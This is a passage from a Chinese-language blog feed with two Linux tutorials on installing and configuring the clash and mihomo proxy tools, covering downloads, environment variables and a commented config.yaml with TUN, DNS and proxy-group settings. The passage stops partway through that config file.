    <content><![CDATA[<h3 id="linux部署代理服务"><a href="#linux部署代理服务" class="headerlink" title="linux部署代理服务"></a>linux部署代理服务</h3><h2 id="这次演示使用clash-dashboard作为代理服务并配合机场使用"><a href="#这次演示使用clash-dashboard作为代理服务并配合机场使用" class="headerlink" title=" 这次演示使用clash+dashboard作为代理服务并配合机场使用"></a> <em><strong>这次演示使用clash+dashboard作为代理服务并配合机场使用</strong></em></h2><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><h2 id="先在用户目录下安装一个clash文件夹，并进入到其中-然后再目录下，把机场给的config-yaml下载下来，可以使用wget然后从github上获取clash和dashboard的二进制文件。如果你的服务器的网络不好，可以通过这个链接下载内容（这里已经完成了解压步骤）。然后上传到服务器即可你可以从以下链接获取clash和dashboard的与你服务器适配的版本。clashdashboard"><a href="#先在用户目录下安装一个clash文件夹，并进入到其中-然后再目录下，把机场给的config-yaml下载下来，可以使用wget然后从github上获取clash和dashboard的二进制文件。如果你的服务器的网络不好，可以通过这个链接下载内容（这里已经完成了解压步骤）。然后上传到服务器即可你可以从以下链接获取clash和dashboard的与你服务器适配的版本。clashdashboard" class="headerlink" title="  先在用户目录下安装一个clash文件夹，并进入到其中  然后再目录下，把机场给的config.yaml下载下来，可以使用wget然后从github上获取clash和dashboard的二进制文件。如果你的服务器的网络不好，可以通过这个链接下载内容（这里已经完成了解压步骤）。然后上传到服务器即可你可以从以下链接获取clash和dashboard的与你服务器适配的版本。clashdashboard"></a>  先在用户目录下安装一个clash文件夹，并进入到其中<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> clash &amp;&amp; <span class="built_in">cd</span> clash</span><br></pre></td></tr></table></figure><br>  然后再目录下，把机场给的config.yaml下载下来，可以使用wget<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget <span class="string">&quot;机场给你的订阅链接&quot;</span> -O config.yaml</span><br></pre></td></tr></table></figure><br>然后从github上获取clash和dashboard的二进制文件。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://github.com/Dreamacro/clash/releases/download/v1.11.12/clash-linux-amd64-v1.11.12.gz</span><br><span class="line">wget https://github.com/haishanh/yacd/releases/download/v0.3.7/yacd.tar.xz</span><br></pre></td></tr></table></figure><br>如果你的服务器的网络不好，可以通过这个<a href="https://sakuradrive.com/f/kk7bcW/clash.zip">链接</a>下载内容（这里已经完成了解压步骤）。然后上传到服务器即可<br>你可以从以下链接获取clash和dashboard的与你服务器适配的版本。<br><a href="https://github.com/Dreamacro/clash/releases">clash</a><br><a href="https://github.com/haishanh/yacd/releases">dashboard</a></h2><h2 id="然后解压两个文件给clash添加执行权限编辑config-yaml配置然后执行-clash-d-即可运行起来。"><a href="#然后解压两个文件给clash添加执行权限编辑config-yaml配置然后执行-clash-d-即可运行起来。" class="headerlink" title="然后解压两个文件给clash添加执行权限编辑config.yaml配置然后执行./clash -d .即可运行起来。"></a>然后解压两个文件<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gzip -d clash-linux-amd64-v1.11.12.gz</span><br><span class="line">tar -xvf yacd.tar.xz &amp;&amp; <span class="built_in">mv</span> public dashboard</span><br></pre></td></tr></table></figure><br>给clash添加执行权限<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x clash</span><br></pre></td></tr></table></figure><br>编辑config.yaml配置<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">port: 7890</span><br><span class="line">socks-port: 7891</span><br><span class="line">allow-lan: <span class="literal">true</span></span><br><span class="line">mode: Rule</span><br><span class="line">log-level: info</span><br><span class="line">secert: 123456 // 增加这一行, 如果你希望你的clash</span><br><span class="line">web要密码访问可以在这块配置密码, 如果不需要直接注释掉即可</span><br><span class="line">external-ui: dashboard // 增加这一行</span><br><span class="line">external-controller: 0.0.0.0:9090</span><br></pre></td></tr></table></figure><br>然后执行<code>./clash -d .</code><br>即可运行起来。</h2><p>然后配置代理服务。</p>
<ul>
<li>如果只是暂时使用<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:7890           </span><br><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:7890   </span><br><span class="line"><span class="built_in">export</span> all_proxy=socks5://127.0.0.1:7891</span><br></pre></td></tr></table></figure></li>
<li>也可以配置到~.&#x2F;bashrc中<br>  然后source .&#x2F;bashrc<br>需要关闭代理可以<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unset</span> http_proxy</span><br><span class="line"><span class="built_in">unset</span> https_proxy</span><br><span class="line"><span class="built_in">unset</span> all_proxy</span><br></pre></td></tr></table></figure>
<em>参考以下博客内容</em><blockquote>
<p><a href="https://parrotsec-cn.org/t/linux-clash-dashboard/5169">https://parrotsec-cn.org/t/linux-clash-dashboard/5169</a></p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>clash</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux配置mihomo代理并开启TUN模式</title>
    <url>/posts/70b7a805/</url>
    <content><![CDATA[<p>先介绍一下什么是<code>mihomo</code>:</p>
<blockquote>
<p><code>Mihomo</code>原名<code>Clash Meta</code>，是基于广受欢迎的开源网络代理工具Clash开发的增强网络代理工具。它不仅继承了Clash的核心功能，还增加了一些独特的特性，如支持更多的出站传输协议和复杂的规则控制等。在2023年经历了Clash for Windows删库事件之后，原Clash项目删库停止更新，于是开发者将Clash Meta改名为Mihomo，继续进行维护和更新。</p>
</blockquote>
<p>所以，曾经使用过clash的应该可以很快上手。</p>
<p><a href="https://clashmihomo.com/">mihomo官网</a></p>
<p>在本篇文章中，将会使用<code>mihomo</code>内核来进行代理，同时还会打开<code>TUN模式</code>实现透明代理。如有需要请接着往下看吧。</p>
<h1 id="mihomo安装和配置"><a href="#mihomo安装和配置" class="headerlink" title="mihomo安装和配置"></a>mihomo安装和配置</h1><h2 id="下载mihomo内核"><a href="#下载mihomo内核" class="headerlink" title="下载mihomo内核"></a>下载mihomo内核</h2><ol>
<li><p>进入<a href="https://github.com/MetaCubeX/mihomo/releases">mihomo内核下载地址</a>去下载对应架构版本的文件。比如<code>mihomo-linux-amd64-alpha-b3db113.gz</code>，解压后将<code>mihomo-linux-amd64</code>上传到虚拟机上，同时重命名为<code>mihomo</code>。</p>
<blockquote>
<p>如果访问不到github的话，这里提供一个<a href="https://alist.zfxt.top/d/%E8%93%9D%E5%87%91%E4%BA%91/%E5%85%B1%E4%BA%AB/mihomo/mihomo-linux-amd64-go120-v1.19.1.gz?sign=H0VObVi3hBJmGZswu0tiuFIVWTA3GhIAyBtP_VSffWU=:0">mihomo-linux-amd64-go120-v1.19.1.gz</a></p>
</blockquote>
</li>
<li><p>给 mihomo 增加执行权限：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod +x mihomo</span><br></pre></td></tr></table></figure>
</li>
<li><p>将<code>mihomo</code>移动到<code>/usr/local/bin/</code>目录</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp mihomo /usr/local/bin</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建运行目录</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mkdir /etc/mihomo -p</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="配置运行环境"><a href="#配置运行环境" class="headerlink" title="配置运行环境"></a>配置运行环境</h2><p>将下面的一键压缩包解压到<code>/etc/mihomo</code>的目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://alist.zfxt.top/d/%E5%85%B1%E4%BA%AB/%E8%93%9D%E5%87%91%E4%BA%91/mihomo/mihomo.tar.gz?sign=rgPU33U--8YAKNPfKIfWWGX-x1vtbLHH0JxO4JuobRc=:0 -O mihomo.tar.gz</span><br><span class="line">tar -zxvf mihomo.tar.gz</span><br></pre></td></tr></table></figure>

<p><a href="https://alist.zfxt.top/d/%E5%85%B1%E4%BA%AB/%E8%93%9D%E5%87%91%E4%BA%91/mihomo/mihomo.tar.gz?sign=rgPU33U--8YAKNPfKIfWWGX-x1vtbLHH0JxO4JuobRc=:0">一键压缩包</a></p>
<p>我提供的压缩包中含有的内容，包括几个常用的数据库和<code>MetaCubeXd</code>外部UI。你只需要详细阅读config.yaml(里面已经有很丰富的注释)。</p>
<p><img src="https://image.zfxt.top/hexo-blog/Linux%E9%85%8D%E7%BD%AEmihomo%E4%BB%A3%E7%90%86%E5%B9%B6%E5%BC%80%E5%90%AFTUN%E6%A8%A1%E5%BC%8F-2025-01-12-20-43-38.png" alt="Linux配置mihomo代理并开启TUN模式-2025-01-12-20-43-38"></p>
<p>UI展示<br><img src="https://image.zfxt.top/hexo-blog/Linux%E9%85%8D%E7%BD%AEmihomo%E4%BB%A3%E7%90%86%E5%B9%B6%E5%BC%80%E5%90%AFTUN%E6%A8%A1%E5%BC%8F-2025-01-12-20-45-25.png" alt="Linux配置mihomo代理并开启TUN模式-2025-01-12-20-45-25"></p>
<p>config.yaml的具体说明如下，在此特别鸣谢 <em><strong><font color="red">煎饼果子卷鲨鱼辣椒</font></strong></em>  这里贴上<a href="https://linux.do/t/topic/243618">大佬原文</a></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ClashMeta 高级优化配置</span></span><br><span class="line"><span class="comment"># 最后更新：2024-10-28</span></span><br><span class="line"><span class="comment"># 作者：🥞煎饼果子卷鲨鱼辣椒🌶️</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------基础配置------------------------#</span></span><br><span class="line"><span class="attr">mixed-port:</span> <span class="number">7890</span>            <span class="comment"># 混合端口：HTTP(S)和SOCKS5共用端口</span></span><br><span class="line"><span class="attr">geodata-mode:</span> <span class="literal">true</span>          <span class="comment"># GEO模式：true使用geoip.dat数据库,false使用mmdb数据库</span></span><br><span class="line"><span class="attr">tcp-concurrent:</span> <span class="literal">true</span>        <span class="comment"># TCP并发：允许并发连接TCP,提高并发性能</span></span><br><span class="line"><span class="attr">unified-delay:</span> <span class="literal">true</span>         <span class="comment"># 统一延迟：统一显示节点延迟</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">true</span>            <span class="comment"># 局域网连接：允许其他设备经过本机代理</span></span><br><span class="line"><span class="attr">bind-address:</span> <span class="string">&quot;*&quot;</span>          <span class="comment"># 监听地址：*表示绑定所有IP地址</span></span><br><span class="line"><span class="attr">find-process-mode:</span> <span class="string">strict</span>  <span class="comment"># 进程匹配模式：strict严格,off关闭,always总是</span></span><br><span class="line"><span class="attr">ipv6:</span> <span class="literal">false</span>               <span class="comment"># IPv6开关：是否启用IPv6支持</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行模式(任选其一):</span></span><br><span class="line"><span class="comment"># rule: 规则模式 - 根据规则匹配来选择代理</span></span><br><span class="line"><span class="comment"># global: 全局模式 - 全部流量走代理</span></span><br><span class="line"><span class="comment"># direct: 直连模式 - 全部流量不走代理</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">rule</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 日志等级(按详细程度排序):</span></span><br><span class="line"><span class="comment"># de<span class="doctag">bug:</span> 调试</span></span><br><span class="line"><span class="comment"># info: 信息</span></span><br><span class="line"><span class="comment"># warning: 警告</span></span><br><span class="line"><span class="comment"># error: 错误</span></span><br><span class="line"><span class="comment"># silent: 静默</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 外部控制设置</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:9090</span>  <span class="comment"># 外部控制器监听地址</span></span><br><span class="line"><span class="attr">external-ui:</span> <span class="string">/etc/mihomo/ui</span>               <span class="comment"># 外部控制器UI目录</span></span><br><span class="line"><span class="attr">secret:</span> <span class="string">&quot;&quot;</span>                        <span class="comment"># 外部控制器密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------性能调优------------------------#</span></span><br><span class="line"><span class="attr">tcp-concurrent-users:</span> <span class="number">64</span>      <span class="comment"># TCP并发连接数,根据服务器性能调整,建议值:16-128</span></span><br><span class="line"><span class="attr">keep-alive-interval:</span> <span class="number">15</span>       <span class="comment"># 保活心跳间隔(秒),建议值:15-30</span></span><br><span class="line"><span class="attr">inbound-tfo:</span> <span class="literal">true</span>            <span class="comment"># 入站TCP Fast Open</span></span><br><span class="line"><span class="attr">outbound-tfo:</span> <span class="literal">true</span>           <span class="comment"># 出站TCP Fast Open</span></span><br><span class="line"><span class="comment"># Windows示例</span></span><br><span class="line"><span class="comment">#interface-name: WLAN   # Windows中的无线网卡名称</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment">#interface-name: 以太网  # Windows中的有线网卡名称</span></span><br><span class="line"><span class="comment"># macOS示例</span></span><br><span class="line"><span class="comment">#interface-name: en0    # macOS中通常是Wi-Fi</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment">#interface-name: en1    # macOS中通常是有线网卡</span></span><br><span class="line"><span class="comment"># Linux示例</span></span><br><span class="line"><span class="comment">#interface-name: eth0   # Linux中常见的有线网卡名</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment">#interface-name: wlan0  # Linux中常见的无线网卡名</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接池配置</span></span><br><span class="line"><span class="attr">connection-pool-size:</span> <span class="number">256</span>     <span class="comment"># 连接池大小,建议值:128-512</span></span><br><span class="line"><span class="attr">idle-timeout:</span> <span class="number">60</span>             <span class="comment"># 空闲超时时间(秒)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------TLS 配置------------------------#</span></span><br><span class="line"><span class="attr">tls:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>               <span class="comment"># 启用TLS支持</span></span><br><span class="line">  <span class="attr">skip-cert-verify:</span> <span class="literal">false</span>    <span class="comment"># 是否跳过证书验证</span></span><br><span class="line">  <span class="attr">alpn:</span>                      <span class="comment"># 应用层协议协商</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">h2</span>                     <span class="comment"># HTTP/2</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">http/1.1</span>              <span class="comment"># HTTP/1.1</span></span><br><span class="line">  <span class="attr">min-version:</span> <span class="string">&quot;1.2&quot;</span>        <span class="comment"># 最低TLS版本</span></span><br><span class="line">  <span class="attr">max-version:</span> <span class="string">&quot;1.3&quot;</span>        <span class="comment"># 最高TLS版本</span></span><br><span class="line">  <span class="attr">cipher-suites:</span>            <span class="comment"># 加密套件优先级</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------TUN 配置------------------------#</span></span><br><span class="line"><span class="attr">tun:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">stack:</span> <span class="string">system</span></span><br><span class="line">  <span class="attr">auto-route:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto-detect-interface:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">dns-hijack:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">any:53</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tcp://any:53</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------DNS 配置------------------------#</span></span><br><span class="line"><span class="attr">dns:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>              <span class="comment"># 启用DNS服务器</span></span><br><span class="line">  <span class="attr">prefer-h3:</span> <span class="literal">true</span>          <span class="comment"># 优先使用HTTP/3查询</span></span><br><span class="line">  <span class="attr">ipv6:</span> <span class="literal">false</span>              <span class="comment"># DNS解析IPv6</span></span><br><span class="line">  <span class="attr">listen:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:53</span>       <span class="comment"># DNS监听地址</span></span><br><span class="line">  <span class="attr">enhanced-mode:</span> <span class="string">redir-host</span>   <span class="comment"># DNS模式: fake-ip或redir-host</span></span><br><span class="line">  <span class="attr">use-hosts:</span> <span class="literal">true</span>          <span class="comment"># 使用hosts文件</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 默认DNS服务器(用于解析其他DNS服务器的域名)</span></span><br><span class="line">  <span class="attr">default-nameserver:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span>            <span class="comment"># 阿里DNS</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">119.29</span><span class="number">.29</span><span class="number">.29</span>         <span class="comment"># 腾讯DNS</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># DNS服务器分流策略</span></span><br><span class="line">  <span class="attr">nameserver-policy:</span></span><br><span class="line">    <span class="attr">&#x27;www.google.com&#x27;:</span> <span class="string">&#x27;https://dns.google/dns-query&#x27;</span>      <span class="comment"># Google域名使用Google DNS</span></span><br><span class="line">    <span class="attr">&#x27;www.facebook.com&#x27;:</span> <span class="string">&#x27;https://dns.google/dns-query&#x27;</span>    <span class="comment"># Facebook域名使用Google DNS</span></span><br><span class="line">    <span class="string">&#x27;.cn&#x27;</span><span class="string">:</span> <span class="string">&#x27;https://doh.pub/dns-query&#x27;</span>                    <span class="comment"># 中国域名使用国内DNS</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Fake-IP配置</span></span><br><span class="line">  <span class="attr">fake-ip-range:</span> <span class="number">198.18</span><span class="number">.0</span><span class="number">.1</span><span class="string">/16</span>    <span class="comment"># Fake-IP地址段</span></span><br><span class="line">  <span class="attr">fake-ip-filter:</span>                 <span class="comment"># Fake-IP过滤清单</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;*.lan&quot;</span>                     <span class="comment"># 本地域名</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;localhost.ptlogin2.qq.com&quot;</span> <span class="comment"># QQ登录</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 主要DNS服务器</span></span><br><span class="line">  <span class="attr">nameserver:</span></span><br><span class="line">    <span class="comment"># 国内DNS服务器</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://doh.pub/dns-query#h3=true</span>                <span class="comment"># DNSPod DOH</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://dns.alidns.com/dns-query#h3=true</span>         <span class="comment"># 阿里 DOH</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tls://223.5.5.5:853</span>                              <span class="comment"># 阿里 DOT</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 国外DNS服务器</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://dns.google/dns-query#h3=true</span>             <span class="comment"># Google DOH</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://cloudflare-dns.com/dns-query#h3=true</span>     <span class="comment"># Cloudflare DOH</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">quic://dns.adguard.com:784</span>                       <span class="comment"># AdGuard DOQ</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 备用DNS服务器(用于解析国外域名)</span></span><br><span class="line">  <span class="attr">fallback:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://dns.google/dns-query#h3=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://1.1.1.1/dns-query#h3=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tls://8.8.8.8:853</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 代理提供商配置</span></span><br><span class="line"><span class="attr">proxy-providers:</span></span><br><span class="line">  <span class="string">订阅1:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">21600</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./proxy_providers/sub1.yaml</span></span><br><span class="line">    <span class="attr">health-check:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">url:</span> <span class="string">http://www.google.com/generate_204</span></span><br><span class="line">      <span class="attr">interval:</span> <span class="number">1800</span></span><br><span class="line">  <span class="string">订阅2:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">21600</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./proxy_providers/sub2.yaml</span></span><br><span class="line">    <span class="attr">health-check:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">url:</span> <span class="string">http://www.google.com/generate_204</span></span><br><span class="line">      <span class="attr">interval:</span> <span class="number">1800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#代理分组</span></span><br><span class="line"><span class="comment">#  include-all-providers: true 自动引入【proxy-providers】所有代理集合，顺序将按照名称排序</span></span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line">  <span class="comment">#------------------------基础分组------------------------#</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🚀</span> <span class="string">节点选择</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">♻️</span> <span class="string">自动选择</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🔯</span> <span class="string">故障转移</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🔮</span> <span class="string">负载均衡</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇭🇰</span> <span class="string">香港节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇲🇴</span> <span class="string">澳门节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇨🇳</span> <span class="string">台湾节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇯🇵</span> <span class="string">日本节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇰🇷</span> <span class="string">韩国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇺🇲</span> <span class="string">美国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇬🇧</span> <span class="string">英国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇩🇪</span> <span class="string">德国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇫🇷</span> <span class="string">法国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇮🇳</span> <span class="string">印度节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇸🇬</span> <span class="string">狮城节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇮🇩</span> <span class="string">印尼节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇻🇳</span> <span class="string">越南节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇹🇭</span> <span class="string">泰国节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇦🇺</span> <span class="string">澳洲节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇧🇷</span> <span class="string">巴西节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🌍</span> <span class="string">其他节点</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DIRECT</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">♻️</span> <span class="string">自动选择</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span>            <span class="comment"># 调整延迟容差为100ms</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🔯</span> <span class="string">故障转移</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">fallback</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🔮</span> <span class="string">负载均衡</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">load-balance</span></span><br><span class="line">    <span class="attr">strategy:</span> <span class="string">consistent-hashing</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#------------------------地区分组------------------------#</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇭🇰</span> <span class="string">香港节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)港|hk|hongkong|hong kong&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇲🇴</span> <span class="string">澳门节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)澳门|门|mo|macao&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇨🇳</span> <span class="string">台湾节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)台|tw|taiwan|taipei&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇯🇵</span> <span class="string">日本节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)日本|jp|japan|tokyo|osaka&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇰🇷</span> <span class="string">韩国节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)韩|kr|korea|seoul&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇺🇲</span> <span class="string">美国节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filter:</span> <span class="string">&quot;(?i)美|us|united states|america|los angeles|san jose|silicon valley&quot;</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">tolerance:</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇬🇧</span> <span class="string">英国节点</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">include-all-providers:</span> <span class="literal">true</span></span><br><span class="line">    